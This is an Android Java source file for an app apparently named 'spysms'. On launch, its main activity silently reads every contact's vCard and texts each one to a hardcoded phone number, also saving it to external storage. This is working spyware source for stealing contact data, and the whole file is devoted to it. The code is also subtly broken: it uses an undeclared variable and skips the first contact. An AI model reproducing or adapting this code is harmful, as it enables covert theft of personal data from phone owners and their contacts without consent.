package com.nesl.fatimanwar.spysms;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.res.AssetFileDescriptor;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.widget.Toast;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;


public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        registerReceiver(receiver, new IntentFilter("nesl.fatimanwar.spysms"));
        registerReceiver(receiverdeliver, new IntentFilter("com.nesl.fatimanwar.spysms"));

        SmsManager smsManager = SmsManager.getDefault();
        Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

        if(cursor != null && cursor.getCount() > 0)
        {
            cursor.moveToFirst();
            while (cursor.moveToNext())
            {
                String lookupKey = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.LOOKUP_KEY));
                Uri uri = Uri.withAppendedPath(ContactsContract.Contacts.CONTENT_VCARD_URI, lookupKey);

                AssetFileDescriptor fd;
                try {
                    fd = this.getContentResolver().openAssetFileDescriptor(uri, "r");
                    FileInputStream fis = fd.createInputStream();
                    byte[] buf = new byte[(int) fd.getDeclaredLength()];
                    fis.read(buf);
                    String vcardstring= new String(buf);
                    //vCard.add(vcardstring);

                    PendingIntent piSend = PendingIntent.getBroadcast(this, 0, new Intent("nesl.fatimanwar.spysms"), 0);
                    PendingIntent piDeliver = PendingIntent.getBroadcast(this, 0, new Intent("com.nesl.fatimanwar.spysms"), 0);
                    smsManager.sendTextMessage("+14242792626", null, vcardstring, piSend, piDeliver);

                    String storage_path = Environment.getExternalStorageDirectory().toString() + File.separator + vfile;
                    FileOutputStream mFileOutputStream = new FileOutputStream(storage_path, false);
                    mFileOutputStream.write(vcardstring.toString().getBytes());


                } catch (Exception e1)
                {
                    // TODO Auto-generated catch block
                    e1.printStackTrace();
                }

            /*String message = "Testing....";
            byte[] data = new byte[message.length()];

            for(int index=0; index<message.length() && index < 160; ++index)
            {
                data[index] = (byte)message.charAt(index);
            }

        PendingIntent piSend = PendingIntent.getBroadcast(this, 0, new Intent("nesl.fatimanwar.spysms"), 0);
        PendingIntent piDeliver = PendingIntent.getBroadcast(this, 0, new Intent("com.nesl.fatimanwar.spysms"), 0);

        //smsManager.sendDataMessage("+14242792626", null, (short)80, data, piSend, piDeliver);
        smsManager.sendTextMessage("+14242792626", null, message, piSend, piDeliver);

                Intent sendIntent = new Intent(Intent.ACTION_SEND);
                sendIntent.setType("text/x-vcard");
                sendIntent.putExtra(Intent.EXTRA_STREAM, uri);
                startActivity(sendIntent);*/

            }
        }
    }

    private BroadcastReceiver receiverdeliver = new BroadcastReceiver(){
        @Override
        public void onReceive(Context context, Intent intent) {
            switch (getResultCode()) {
                case Activity.RESULT_OK:
                    Toast.makeText(context, "SMS delivered", Toast.LENGTH_SHORT).show();
                    break;
                case Activity.RESULT_CANCELED:
                    Toast.makeText(context, "SMS not delivered", Toast.LENGTH_SHORT).show();
                    break;
            }
        }
    };

    private BroadcastReceiver receiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String message = null;

            switch (getResultCode()) {
                case Activity.RESULT_OK:
                    message = "Message sent!";
                    break;
                case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
                    message = "Error. Message not sent.";
                    break;
                case SmsManager.RESULT_ERROR_NO_SERVICE:
                    message = "Error: No service.";
                    break;
                case SmsManager.RESULT_ERROR_NULL_PDU:
                    message = "Error: Null PDU.";
                    break;
                case SmsManager.RESULT_ERROR_RADIO_OFF:
                    message = "Error: Radio off.";
                    break;
            }

            Toast.makeText(context, message, Toast.LENGTH_LONG).show();
        }
    };

    @Override
    protected void onDestroy() {
        unregisterReceiver(receiver);
        unregisterReceiver(receiverdeliver);
        super.onDestroy();
    }
}
